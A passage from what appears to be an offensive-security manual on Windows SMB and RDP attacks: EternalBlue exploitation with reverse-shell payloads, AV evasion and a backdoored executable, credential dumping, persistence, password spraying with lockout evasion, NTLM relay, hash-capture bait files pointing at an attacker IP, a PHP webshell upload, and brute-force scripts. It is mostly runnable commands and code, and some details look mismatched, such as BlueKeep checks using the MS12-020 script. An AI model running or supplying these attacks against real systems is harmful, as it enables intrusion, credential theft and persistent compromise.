# Clone repository
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

# Install dependencies
pip install -r requirements.txt

# Generate shellcode
cd shellcode
./shell_prep.sh

# Follow prompts:
# - Select OS (Windows 7, 2008, etc.)
# - Enter LHOST (your IP)
# - Enter LPORT (your port)

# Setup listener
cd ..
./listener_prep.sh

# Execute exploit
python eternalblue_exploit7.py 192.168.1.100 shellcode/sc_x64.bin

# For Windows 2008
python eternalblue_exploit8.py 192.168.1.100 shellcode/sc_x64.bin
```

4. **Manual exploitation with worawit's scripts**:

```bash
# Clone repository
git clone https://github.com/worawit/MS17-010.git
cd MS17-010

# Generate reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f raw -o sc_x64_msf.bin

# Setup listener
nc -lvnp 4444

# Execute exploit
python eternalblue_exploit7.py 192.168.1.100 sc_x64_msf.bin

# Alternative: kernel shellcode
python eternalblue_exploit8.py 192.168.1.100 sc_x64_kernel.bin
```

**Post-Exploitation:**

```bash
# Once shell is obtained
whoami
hostname

# Check privileges
whoami /priv

# Check for AV
tasklist | findstr /i "defender av mcafee symantec"

# Disable Windows Defender [Inference - requires admin privileges]
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

# Dump credentials
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam

# Establish persistence
meterpreter> run persistence -X -i 10 -p 4445 -r 10.10.14.5

# Pivot to other machines
meterpreter> run autoroute -s 192.168.1.0/24
meterpreter> background
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

**Troubleshooting Exploitation:**

```bash
# If exploit fails, verify:
# 1. SMBv1 is enabled
nmap -p445 --script smb-protocols target.com

# 2. Named pipes are accessible
smbclient -L //target.com -N
enum4linux -a target.com

# 3. Adjust target architecture
# Windows 7 SP1 x64 = target 0
# Windows Server 2008 R2 = target 1
# Windows 8/8.1/2012 x64 = targets 2-4

# 4. Increase exploit attempts
set MaxExploitAttempts 10
set VERBOSE true

# 5. Use different payload
set PAYLOAD windows/x64/shell_reverse_tcp
# or
set PAYLOAD windows/shell_reverse_tcp  # 32-bit
```

**Creating Custom EternalBlue Payload:**

```bash
# Generate custom shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 \
  -f raw -o custom_payload.bin

# Encode to evade AV
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x64/xor_dynamic -i 10 -f raw -o encoded_payload.bin

# Embed in legitimate executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x putty.exe -k -f exe -o backdoored_putty.exe
```

### Dictionary/Brute Force SMB

**Username Enumeration:**

1. **Using enum4linux**:

```bash
# Enumerate users
enum4linux -U target.com

# Enumerate with null session
enum4linux -a target.com

# Enumerate shares
enum4linux -S target.com

# Get detailed information
enum4linux -v target.com

# Save output
enum4linux -a target.com | tee enum4linux_output.txt
```

2. **Using rpcclient**:

```bash
# Connect with null session
rpcclient -U "" -N target.com

# Enumerate users
rpcclient $> enumdomusers
rpcclient $> querydispinfo
rpcclient $> querydominfo

# Get user details
rpcclient $> queryuser 0x1f4  # RID 500 (Administrator)
rpcclient $> queryuser 0x3e8  # RID 1000 (first user)

# Enumerate groups
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200  # Domain Admins

# Automated user enumeration
for rid in $(seq 500 2000); do
  rpcclient -U "" -N target.com -c "queryuser 0x$(printf '%x' $rid)" 2>/dev/null | grep "User Name"
done
```

3. **Using crackmapexec**:

```bash
# Enumerate users
crackmapexec smb target.com --users

# Enumerate with credentials
crackmapexec smb target.com -u 'guest' -p '' --users

# Enumerate shares
crackmapexec smb target.com --shares

# Enumerate logged-in users
crackmapexec smb target.com --sessions

# RID brute force
crackmapexec smb target.com --rid-brute
```

4. **Using Metasploit**:

```bash
msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS target.com
run

# Enumerate shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS target.com
run
```

**Password Attacks:**

1. **Using crackmapexec (recommended)**:

```bash
# Single user password spray
crackmapexec smb target.com -u administrator -p password123

# Password spray against multiple users
crackmapexec smb target.com -u users.txt -p 'Password123'

# Brute force single user
crackmapexec smb target.com -u administrator -p passwords.txt

# Brute force multiple users
crackmapexec smb target.com -u users.txt -p passwords.txt

# Continue on success
crackmapexec smb target.com -u users.txt -p passwords.txt --continue-on-success

# Against subnet
crackmapexec smb 192.168.1.0/24 -u administrator -p passwords.txt

# Use NTLM hash instead of password
crackmapexec smb target.com -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Local authentication (for workgroup)
crackmapexec smb target.com -u administrator -p password123 --local-auth

# Domain authentication
crackmapexec smb target.com -u administrator -p password123 -d DOMAIN
```

2. **Using Hydra**:

```bash
# Single user brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://target.com

# Multiple users
hydra -L users.txt -P passwords.txt smb://target.com

# With domain
hydra -L users.txt -P passwords.txt target.com smb -V -f

# Limit parallel tasks (avoid detection)
hydra -l administrator -P passwords.txt smb://target.com -t 4

# Continue on success
hydra -L users.txt -p 'Password123' smb://target.com -F

# Save results
hydra -L users.txt -P passwords.txt smb://target.com -o hydra_results.txt
```

3. **Using Metasploit**:

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 10
set VERBOSE false
run

# Stop on success
set STOP_ON_SUCCESS true
run

# Use hash instead
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
run
```

4. **Using Medusa**:

```bash
# Single user
medusa -h target.com -u administrator -P passwords.txt -M smbnt

# Multiple users
medusa -h target.com -U users.txt -P passwords.txt -M smbnt

# With domain
medusa -h target.com -u administrator -P passwords.txt -M smbnt -m DOMAIN:CORP

# Parallel tasks
medusa -h target.com -U users.txt -P passwords.txt -M smbnt -t 5
```

5. **Using nxc (NetExec - newer crackmapexec fork)**:

```bash
# Install
pipx install git+https://github.com/Pennyw0rth/NetExec

# Password spray
nxc smb target.com -u users.txt -p 'Password123!' --continue-on-success

# Brute force
nxc smb target.com -u administrator -p passwords.txt

# Pass-the-hash
nxc smb target.com -u administrator -H 'hash_here'
```

**Common Password Lists:**

```bash
# Default Windows passwords
/usr/share/wordlists/metasploit/common_passwords.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

# Create custom wordlist
cat > common_passwords.txt <<EOF
Password123
Password123!
Welcome1
Welcome123
Admin123
Admin@123
Summer2024
Winter2024
Company123
EOF

# Generate username variations
cat > users.txt <<EOF
administrator
admin
guest
Administrator
Admin
Guest
EOF
```

**Password Spraying Best Practices:**

```bash
# Low and slow (avoid lockouts)
crackmapexec smb target.com -u users.txt -p 'Password123' --delay 3

# Check password policy first
crackmapexec smb target.com --pass-pol

# Use common passwords only
crackmapexec smb target.com -u users.txt -p passwords_top10.txt

# Monitor for lockouts
crackmapexec smb target.com -u administrator -p wrong_pass --verbose
# Look for "STATUS_ACCOUNT_LOCKED_OUT"

# Space out attempts
for pass in $(cat common_passwords.txt); do
  echo "[*] Trying password: $pass"
  crackmapexec smb target.com -u users.txt -p "$pass"
  sleep 1800  # Wait 30 minutes between passwords
done
```

**Null Session Exploitation:**

```bash
# Test null session
smbclient -L //target.com -N
rpcclient -U "" -N target.com

# Enumerate shares with null session
crackmapexec smb target.com -u '' -p '' --shares

# Enumerate users with null session
enum4linux -U target.com
rpcclient -U "" -N target.com -c "enumdomusers"

# Access shares with null session
smbclient //target.com/share -N
smbget -R smb://target.com/share -U ""
```

### SMB Version Vulnerabilities

**SMB Version Detection:**

```bash
# Using Nmap
nmap -p445 --script smb-protocols target.com
nmap -p445 --script smb-os-discovery target.com

# Using Metasploit
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS target.com
run

# Using crackmapexec
crackmapexec smb target.com

# Using smbclient
smbclient -L //target.com
```

**SMBv1 Vulnerabilities:**

1. **MS08-067 (Conficker)**:

```bash
# Check vulnerability
nmap -p445 --script smb-vuln-ms08-067 target.com

# Exploit with Metasploit
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target.com
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
show targets
set TARGET 0  # Windows XP SP3
exploit
```

2. **MS06-025 (RPC Vulnerability)**:

```bash
# Check vulnerability
nmap -p445 --script smb-vuln-ms06-025 target.com

# Exploit
msfconsole
use exploit/windows/smb/ms06_025_rasmans_reg
set RHOSTS target.com
exploit
```

3. **MS10-061 (Print Spooler)**:

```bash
# Check vulnerability
nmap -p445 --script smb-vuln-ms10-061 target.com

# Exploit
msfconsole
use exploit/windows/smb/ms10_061_spoolss
set RHOSTS target.com
exploit
```

**SMBv2 Vulnerabilities:**

1. **SMBGhost (CVE-2020-0796)**:

```bash
# Check for vulnerability
nmap -p445 --script smb-vuln-cve-2020-0796 target.com

# Using Metasploit
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target.com
run

# Exploit (if vulnerable)
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS target.com
set LHOST 10.10.14.5
exploit
```

2. **Using dedicated scanner**:

```bash
# Download scanner
wget https://raw.githubusercontent.com/ollypwn/SMBGhost/master/scanner.py

# Scan
python3 scanner.py -i target.com

# Scan subnet
python3 scanner.py -i 192.168.1.0/24
```

**SMBv3 Vulnerabilities:**

1. **SMB Signing Not Required**:

```bash
# Check SMB signing
nmap -p445 --script smb-security-mode target.com
nmap -p445 --script smb2-security-mode target.com

# Using crackmapexec
crackmapexec smb target.com --gen-relay-list targets.txt

# Exploit with Responder + ntlmrelayx
# Terminal 1: Start Responder
responder -I eth0 -v

# Terminal 2: Setup relay
ntlmrelayx.py -tf targets.txt -smb2support

# Wait for authentications to relay
```

**Comprehensive SMB Vulnerability Scanning:**

```bash
# All SMB vulnerabilities with Nmap
nmap -p445 --script "smb-vuln*" target.com -oA smb_vulns

# Multiple hosts
nmap -p445 --script "smb-vuln*" -iL targets.txt

# Using Metasploit
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Check multiple vulnerabilities
use auxiliary/scanner/smb/pipe_auditor
set RHOSTS target.com
run

# SMB2 capabilities
use auxiliary/scanner/smb/smb2
set RHOSTS target.com
run
```

**Specific Version Exploits:**

```bash
# Windows XP/2003
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms06_040_netapi

# Windows 7/2008
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms10_061_spoolss

# Windows 8/2012
use exploit/windows/smb/ms17_010_eternalblue

# Windows 10/2016/2019
use exploit/windows/smb/cve_2020_0796_smbghost
```

### NTLM Exploitation

**NTLM Relay Attacks:**

1. **Setup with Responder and ntlmrelayx**:

```bash
# Identify hosts without SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Disable SMB and HTTP in Responder
nano /usr/share/responder/Responder.conf
# Set SMB = Off
# Set HTTP = Off

# Start Responder
responder -I eth0 -v

# In another terminal, start ntlmrelayx
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# With command execution
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"

# Dump SAM
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --sam

# Interactive shell
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Connect with: nc 127.0.0.1 11000
```

2. **NTLM Relay to LDAP (for Domain Admin)**:

```bash
# Relay to domain controller
impacket-ntlmrelayx -t ldap://dc.domain.local -smb2support --escalate-user lowpriv

# Relay with delegation rights
impacket-ntlmrelayx -t ldaps://dc.domain.local -smb2support --delegate-access

# Add computer account
impacket-ntlmrelayx -t ldaps://dc.domain.local -smb2support --add-computer
```

3. **NTLM Relay via IPv6 (mitm6)**:

```bash
# Install mitm6
pip3 install mitm6

# Start mitm6
mitm6 -d domain.local

# In another terminal
impacket-ntlmrelayx -6 -t ldaps://dc.domain.local -wh attacker-wpad

# Wait for IPv6 DNS poisoning and authentication
```

**Pass-the-Hash Attacks:**

1. **Using crackmapexec**:

```bash
# Single host
crackmapexec smb target.com -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Multiple hosts
crackmapexec smb 192.168.1.0/24 -u administrator -H 'hash' --local-auth

# Execute commands
crackmapexec smb target.com -u administrator -H 'hash' -x "whoami"

# Dump SAM
crackmapexec smb target.com -u administrator -H 'hash' --sam

# Dump LSA secrets
crackmapexec smb target.com -u administrator -H 'hash' --lsa
```

2. **Using Impacket psexec**:

```bash
# Connect with hash
impacket-psexec administrator@target.com -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Domain user
impacket-psexec DOMAIN/administrator@target.com -hashes :hash

# Alternative tools
impacket-smbexec administrator@target.com -hashes :hash
impacket-wmiexec administrator@target.com -hashes :hash
impacket-atexec administrator@target.com -hashes :hash "whoami"
```

3. **Using pth-toolkit**:

```bash
# Install
apt-get install passing-the-hash

# Execute commands
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:hash //target.com cmd

# SMB client
pth-smbclient //target.com/C$ -U administrator%hash

# RDP (if enabled)
pth-xfreerdp /u:administrator /d:domain /pth:hash /v:target.com
```

**NTLM Capture and Cracking:**

1. **Capture with Responder**:

```bash
# Start Responder
responder -I eth0 -wv

# Analyze captured hashes
cat /usr/share/responder/logs/*.txt | grep NTLMv2

# Extract hashes
grep "NTLMv2" /usr/share/responder/logs/*.txt > captured_hashes.txt
```

2. **Force authentication with various methods**:

```bash
# SMB file share link
echo '[InternetShortcut]' > @test.url
echo 'URL=file://10.10.14.5/share' >> @test.url

# LNK file
python /opt/lnkbomb.py --host 10.10.14.5 --type ntlm --output stealer.lnk

# SCF file
cat > @stealer.scf <<EOF
[Shell]
Command=2
IconFile=\\\\10.10.14.5\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# HTML file
cat > stealer.html <<EOF
<img src="file://10.10.14.5/share/image.jpg">
EOF

# Place in SMB share that victim accesses
```

3. **Crack captured hashes**:

```bash
# Using hashcat
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Using john
john --format=netntlmv2 captured_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
hashcat -m 5600 captured_hashes.txt --show
john --format=netntlmv2 captured_hashes.txt --show
```

**SMB Relay via WebDAV:**

```bash
# Check if WebDAV is enabled
davtest -url http://target.com/webdav

# Relay authentication
impacket-ntlmrelayx -t http://target.com/webdav -smb2support

# Upload webshell
echo "<?php system(\$_GET['c']); ?>" > shell.php
curl --upload-file shell.php -u : --ntlm http://target.com/webdav/shell.php

# Access shell
curl http://target.com/webdav/shell.php?c=whoami
```

**NTLM Downgrade Attacks:**

```bash
# Force NTLMv1 (easier to crack)
# Edit Responder.conf
nano /usr/share/responder/Responder.conf
# Set LM and NTLM to On

# Start Responder forcing v1
responder -I eth0 -wv --lm

# Crack NTLMv1 with hashcat
hashcat -m 5500 ntlmv1_hash.txt /usr/share/wordlists/rockyou.txt
```

**SMB Enumeration with Valid Credentials:**

```bash
# Using crackmapexec
crackmapexec smb target.com -u user -p pass --shares
crackmapexec smb target.com -u user -p pass --disks
crackmapexec smb target.com -u user -p pass --users
crackmapexec smb target.com -u user -p pass --groups
crackmapexec smb target.com -u user -p pass --local-groups
crackmapexec smb target.com -u user -p pass --sessions
crackmapexec smb target.com -u user -p pass --pass-pol
crackmapexec smb target.com -u user -p pass --rid-brute

# Dump everything
crackmapexec smb target.com -u user -p pass --spider C$ --pattern txt
crackmapexec smb target.com -u user -p pass -M spider_plus

# Using smbmap
smbmap -H target.com -u user -p pass
smbmap -H target.com -u user -p pass -R  # Recursive listing
smbmap -H target.com -u user -p pass -x "whoami"  # Execute command
smbmap -H target.com -u user -p pass --upload payload.exe C$\\temp\\payload.exe
smbmap -H target.com -u user -p pass --download C$\\important\\data.txt

# Using smbclient
smbclient //target.com/C$ -U user%pass
smbclient //target.com/ADMIN$ -U administrator%pass
```

**Kerberos vs NTLM:**

```bash
# Force NTLM authentication (disable Kerberos)
crackmapexec smb target.com -u user -p pass --kerberos false

# Use Kerberos (if tickets available)
crackmapexec smb target.com -u user -p pass --kerberos

# With ticket
export KRB5CCNAME=/tmp/krb5cc_ticket
impacket-psexec target.com -k -no-pass
```

---

## RDP Exploitation

### RDP Brute Force

RDP brute force attacks attempt to gain access by systematically testing username and password combinations against Remote Desktop Protocol services. Success depends on weak credentials, inadequate rate limiting, and account lockout policies.

#### Identifying RDP Services

Locate and fingerprint RDP services on the network:

```bash
# Port scanning for RDP (default port 3389)
nmap -p 3389 target.com
nmap -p 3389 -sV target.com  # Service version detection

# RDP service scan across network range
nmap -p 3389 192.168.1.0/24 -oG /tmp/rdp_hosts.grep

# Extract active RDP hosts
grep "open" /tmp/rdp_hosts.grep | awk '{print $2}' > /tmp/rdp_targets.txt

# Rapid RDP identification
masscan -p 3389 192.168.1.0/24 --rate 10000

# RDP banner grabbing
timeout 5 bash -c 'cat < /dev/null > /dev/tcp/target.com/3389' 2>/dev/null && echo "RDP Service Open"

# Using Nmap RDP fingerprinting scripts
nmap -p 3389 --script rdp-enum-encryption target.com
nmap -p 3389 --script rdp-vuln-ms12-020 target.com  # BlueKeep check

# Custom RDP detection script
python3 << 'EOF'
import socket
import sys

def check_rdp(host, port=3389):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"[+] RDP Open: {host}:{port}")
            sock.close()
            return True
    except Exception as e:
        pass
    return False

# Scan from file
with open("/tmp/hosts.txt") as f:
    for host in f:
        check_rdp(host.strip())
EOF
```

#### Hydra RDP Brute Force

Use Hydra for systematic RDP credential testing:

```bash
# Basic RDP brute force
hydra -l administrator -p password rdp://target.com

# Multiple usernames and passwords
hydra -L users.txt -P passwords.txt rdp://target.com

# Common Windows usernames
echo -e "administrator\nadmin\nuser\ntest\nguest\nroot" > users.txt

# Default/weak password wordlist
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://target.com

# Verbose output with attempt monitoring
hydra -L users.txt -P passwords.txt rdp://target.com -v

# Multiple threads for parallelization
hydra -L users.txt -P passwords.txt rdp://target.com -t 16

# Specify non-standard RDP port
hydra -L users.txt -P passwords.txt rdp://target.com:13389

# Save results to file
hydra -L users.txt -P passwords.txt rdp://target.com -o /tmp/hydp_results.txt

# Exit on first successful credential
hydra -L users.txt -P passwords.txt rdp://target.com -f

# Combined with domain information
hydra -L users.txt -P passwords.txt -e nsr rdp://target.com
# -e nsr: try user as password, null password, reverse
```

#### Medusa RDP Brute Force

Alternative brute force approach using Medusa:

```bash
# Basic Medusa RDP attack
medusa -h target.com -u administrator -P passwords.txt -M rdp

# Multiple hosts
medusa -H hosts.txt -u administrator -P passwords.txt -M rdp

# Multiple users
medusa -h target.com -U users.txt -P passwords.txt -M rdp

# Verbose output
medusa -h target.com -u administrator -P passwords.txt -M rdp -v 2

# Threading for speed
medusa -h target.com -u administrator -P passwords.txt -M rdp -t 16

# Output to file
medusa -h target.com -u administrator -P passwords.txt -M rdp -O /tmp/medusa_results.txt
```

#### Rate Limiting and Detection Evasion

Account lockout and rate limiting complicate brute force attacks. Test evasion techniques:

```bash
# Reduce thread count to avoid rapid failures triggering lockout
hydra -L users.txt -P passwords.txt rdp://target.com -t 1

# Add delays between attempts
# Note: Hydra doesn't have built-in delay; use wrapper script

#!/bin/bash
# Slow brute force script
while read user; do
  while read pass; do
    echo "Attempting $user:$pass"
    timeout 10 rdesktop -u "$user" -p "$pass" target.com 2>/dev/null && \
      echo "[+] Success: $user:$pass" && break
    sleep 2  # Delay between attempts
  done < passwords.txt
done < users.txt

# Distribute attempts across multiple target systems (if accessible)
# Try different RDP ports (non-standard ports may have different policies)
for port in 3389 13389 23389 33389; do
  hydra -L users.txt -P passwords.txt rdp://target.com:$port -t 1
done

# Test without locking out account (if account lockout threshold known)
# Example: Lockout after 5 failures, test with 4 attempts per user
for user in $(cat users.txt); do
  for i in {1..4}; do
    hydra -l $user -P passwords.txt rdp://target.com -f 2>/dev/null
  done
done

# Monitor for lockout indicators
# 530 error code indicates locked account or time restriction
```

#### RDP Protocol Analysis

Analyze RDP protocol responses to optimize attacks:

```bash
# Capture RDP traffic
tcpdump -i any -w rdp_traffic.pcap 'tcp port 3389'

# Monitor connection attempts
tcpdump -i any -A 'tcp port 3389' | grep -E "RDP|NTLMSSP|CREDENTIALS"

# Check response codes from RDP service
timeout 5 rdesktop -u admin target.com 2>&1 | grep -E "Connection|denied|failed|error"

# Parse RDP errors to identify account status
# 0x0 = Success
# 0x1 = Login failed (wrong credentials)
# 0x80000014 = Account locked
# 0x80090006 = Time restriction

# Test authentication response timing
time rdesktop -u admin -p wrongpass target.com 2>&1
# Valid accounts may respond faster/slower than invalid
```

#### Custom RDP Brute Force Script

Develop targeted brute force attack:

```python
#!/usr/bin/env python3
import socket
import sys
import time
from threading import Thread, Lock
import struct

class RDPBruteForce:
    def __init__(self, target, port=3389, threads=4):
        self.target = target
        self.port = port
        self.threads = threads
        self.lock = Lock()
        self.found = False
        
    def check_rdp_open(self):
        """Verify RDP service is accessible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0
        except:
            return False
    
    def test_credentials(self, username, password):
        """Test single credential pair"""
        if self.found:
            return False
            
        try:
            # Attempt RDP connection (requires external RDP client or library)
            # Using rdesktop command for simplicity
            import subprocess
            result = subprocess.run(
                ['rdesktop', '-u', username, '-p', password, 
                 '-d', 'WORKGROUP', self.target],
                timeout=10,
                capture_output=True
            )
            if result.returncode == 0:
                with self.lock:
                    print(f"[+] SUCCESS: {username}:{password}")
                    self.found = True
                return True
        except:
            pass
        return False
    
    def worker(self, credentials_queue):
        """Worker thread for credential testing"""
        while True:
            try:
                username, password = credentials_queue.get(timeout=1)
            except:
                break
                
            if not self.found:
                self.test_credentials(username, password)
    
    def brute_force(self, users, passwords):
        """Execute brute force attack"""
        if not self.check_rdp_open():
            print(f"[-] RDP Service not accessible on {self.target}:{self.port}")
            return
        
        print(f"[*] RDP Service confirmed on {self.target}:{self.port}")
        print(f"[*] Starting brute force with {self.threads} threads")
        
        from queue import Queue
        q = Queue()
        
        # Populate queue with credentials
        for user in users:
            for passwd in passwords:
                q.put((user, passwd))
        
        # Create and start worker threads
        thread_list = []
        for _ in range(self.threads):
            t = Thread(target=self.worker, args=(q,))
            t.start()
            thread_list.append(t)
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        if self.found:
            print("[+] Attack successful")
        else:
            print("[-] Attack failed - no credentials found")

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    
    users = ["administrator", "admin", "user", "guest"]
    passwords = ["password", "123456", "admin", "letmein"]
    
    brute_forcer = RDPBruteForce(target, threads=4)
    brute_forcer.brute_force(users, passwords)
```

### RDP Credential Relaying

RDP credential relaying exploits improperly validated authentication to forward credentials to additional systems, achieving lateral movement.

#### Understanding RDP Authentication

RDP authentication flows and potential interception points:

```bash
# Monitor RDP authentication process
tcpdump -i any -A 'tcp port 3389' | grep -E "NTLMSSP|NtProofStr|ClientChallenge"

# Capture RDP traffic for analysis
tcpdump -i any -w rdp_auth.pcap 'tcp port 3389'

# Analyze with Wireshark
wireshark rdp_auth.pcap
# Look for: NTLM authentication, security layers, encryption

# RDP security layer detection
nmap -p 3389 --script rdp-enum-encryption target.com
```

#### NTLMv2 Relay Attack

Relay captured NTLMv2 authentication from RDP:

```bash
# Capture NTLMv2 handshake
# Method 1: Position in network to intercept (MITM)

# Using responder to capture hashes
responder -I eth0 -w -b

# Monitor for SMB/RDP authentication
# Captured hashes can be relayed to other services

# Relay captured authentication to target system
# Using impacket-ntlmrelayx
impacket-ntlmrelayx -t smb://target_system.local -c "whoami"

# RDP-specific relay (if target accepts relayed credentials)
impacket-ntlmrelayx -t rpc://target_system.local

# Redirect RDP traffic through proxy
arpspoof -i eth0 -t victim.com gateway.com  # ARP spoofing
sslstrip -l 3389 -p  # Intercept and modify
```

#### Credential Forwarding via RDP Gateway

Exploit RDP Gateway for credential relaying:

```bash
# Identify RDP Gateway (Terminal Gateway)
nmap -p 443 target.com --script rdp-enum

# RDP Gateway uses HTTPS, may cache credentials
# Test if credentials can be forwarded to internal systems

# Connect through RDP Gateway
mstsc /gateway:gateway.target.com

# Use RDP Gateway for credential relay
# Impacket doesn't directly support RDP Gateway relay
# Requires custom implementation or manual setup

# Check for stored credentials in RDP Gateway
# If compromised, extract cached authentication tokens
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" 2>/dev/null
```

#### RDP Credential Cache Exploitation

Extract and relay cached RDP credentials:

```bash
# Locate RDP credential cache (Windows)
reg query "HKCU\Software\Microsoft\RAS Connections" 
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

# RDP credential files (encrypted)
dir %AppData%\Microsoft\RAS\*.RAS 2>nul
dir %AppData%\Microsoft\Credentials\* 2>nul

# Extract cached credentials using mimikatz (post-exploitation)
mimikatz.exe "sekurlsa::logonpasswords" "exit"

# Decrypt stored RDP credentials
# Requires access to DPAPI keys or local system

# Relay extracted credentials
mstsc /u:domain\user /p:password /v:target.com

# Automated credential relay chain
python3 << 'EOF'
import subprocess
import sys

def relay_credentials(source_creds, target_rDP):
    """Relay captured credentials to target RDP"""
    user, password = source_creds.split(':')
    domain = "WORKGROUP"  # or detected domain
    
    # Attempt RDP connection with relayed credentials
    try:
        result = subprocess.run([
            'rdesktop', 
            '-u', f'{domain}\\{user}',
            '-p', password,
            '-d', domain,
            target_rdp
        ], timeout=30)
        return result.returncode == 0
    except Exception as e:
        print(f"Error: {e}")
        return False

# Usage
relay_credentials("admin:password", "internal-system.local")
EOF
```

#### Printer Nightmare (CVE-2021-1675) Credential Relay

[Inference] The Printer Nightmare vulnerability allows attackers to coerce authentication over RPC, potentially relaying credentials captured from RDP sessions.

```bash
# Exploit Printer Nightmare for credential coercion
# Requires SpoolService to be accessible

# Using impacket-ntlmrelayx with Printer Nightmare
impacket-ntlmrelayx -t smb://target.local -c "whoami"

# Then trigger Printer Nightmare to coerce authentication
# Requires access or network position to force connection

# Alternative: Use Metasploit for automated exploitation
msfconsole
> use auxiliary/scanner/smb/smb_enum_shares
> set RHOSTS target.local
> run
```

#### Kerberos Credential Relay in RDP Environment

Relay Kerberos tickets obtained from RDP:

```bash
# If RDP environment uses Kerberos authentication
# Kerberos tickets can be relayed more effectively than NTLMv2

# Capture Kerberos ticket from RDP session
kinit -f user@REALM

# Relay Kerberos ticket to additional systems
# Using impacket with Kerberos support
KRB5CCNAME=/tmp/krb5_ticket impacket-ntlmrelayx -t smb://target.local

# Unconstrained delegation exploitation
# If RDP server has unconstrained delegation enabled
# Captured TGT can access arbitrary services

# Check for delegation flags
ldapsearch -H ldap://dc.local -x -b "dc=local" "(servicePrincipalName=*)" \
  userAccountControl

# Exploit via delegation
# Requires deep Active Directory knowledge
```

### BlueKeep Exploitation (CVE-2019-0708)

BlueKeep is a critical RDP vulnerability affecting Windows systems without patched RDP services. It enables remote code execution without authentication.

#### BlueKeep Vulnerability Overview

[Unverified] BlueKeep affects Windows XP through Windows Server 2019 if not patched. The vulnerability exists in the RDP protocol implementation, allowing buffer overflow during session initialization.

```bash
# Identify vulnerable systems
nmap -p 3389 --script rdp-vuln-ms12-020 target.com

# Enhanced vulnerability detection
nmap -p 3389 --script rdp-* target.com

# Manual RDP connection to test vulnerability
# Vulnerable systems may crash or behave abnormally
rdesktop -u guest -p "" target.com

# Check Windows RDP version
# Vulnerable: Older Windows versions with unpatched RDP
# Windows XP, Vista, Server 2003, Server 2008 (unpatched)
# Windows 7, Server 2008 R2 (unpatched)
# Windows 8, 8.1, Server 2012, Server 2012 R2 (unpatched)
# Windows 10 (versions 1507-1607 if unpatched)
```

#### BlueKeep Detection

Detect vulnerable RDP implementations:

```bash
# Using Metasploit BlueKeep scanner
msfconsole
> use auxiliary/scanner/rdp/rdp_scanner
> set RHOSTS target.com
> run

# Nmap CVE-2019-0708 scanner
nmap -p 3389 --script rdp-vuln-ms12-020 --script-args rdp-vuln-ms12-020.check_cves=true target.com

# Python-based detector
python3 << 'EOF'
import socket
import sys

def detect_bluekeep(host, port=3389):
    """
    Basic BlueKeep detection by analyzing RDP protocol response
    [Unverified] This is a simplified detector - actual vulnerability
    confirmation requires more sophisticated analysis
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # Send RDP X.224 connection initiate
        rdp_pkt = bytes.fromhex(
            '030000130ee000000000080003000008000600000000'
        )
        sock.send(rdp_pkt)
        
        # Receive response
        response = sock.recv(1024)
        sock.close()
        
        # Check response for vulnerability indicators
        # [Inference] Unpatched systems respond with specific patterns
        if len(response) > 0:
            print(f"[*] RDP service responding: {host}")
            # Further analysis needed for definitive detection
            return True
    except:
        pass
    return False

detect_bluekeep(sys.argv[1] if len(sys.argv) > 1 else "target.com")
EOF
```

#### BlueKeep Exploitation with Metasploit

